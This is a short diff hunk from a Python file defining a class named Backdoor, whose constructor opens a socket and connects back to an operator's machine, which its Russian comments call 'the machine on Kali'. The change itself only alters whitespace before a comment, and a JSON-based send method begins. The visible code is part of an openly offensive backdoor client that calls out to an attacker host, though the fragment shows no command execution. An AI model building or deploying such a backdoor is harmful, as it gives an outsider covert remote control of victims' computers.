@@ -8,7 +8,7 @@ class Backdoor:
 
 	def __init__(self, ip: str, port: int):
 		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 	# создаем объект сокета
-		self.connection.connect((ip, port))	 									# подключаемся к машине на кали
+		self.connection.connect((ip, port))	# подключаемся к машине на кали
 
 	def reliable_send(self, data):
 		""" Конвертируем в JSON """
